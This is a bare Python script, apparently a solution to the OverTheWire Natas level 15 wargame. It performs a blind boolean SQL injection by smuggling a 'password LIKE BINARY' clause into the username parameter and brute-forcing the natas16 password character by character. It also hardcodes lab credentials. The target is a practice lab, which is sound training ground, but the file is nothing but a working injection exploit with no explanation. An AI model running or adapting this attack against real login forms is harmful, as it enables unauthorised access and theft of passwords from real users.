import requests
from requests.auth import HTTPBasicAuth
import string

chars = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
nodone = True
while nodone:
    nodone = False
    for i in string.ascii_lowercase+string.ascii_uppercase+string.digits:
        checking = chars + i
        # print (checking)
        res = requests.get("http://natas15.natas.labs.overthewire.org/?debug=true&username=natas16\" and password LIKE BINARY \"{0}%".format(checking), auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if ('exists.' in res.text):
            chars += i
            print ("So far: " + chars)
            nodone = True
            break
 
print ("Final: " + chars)
        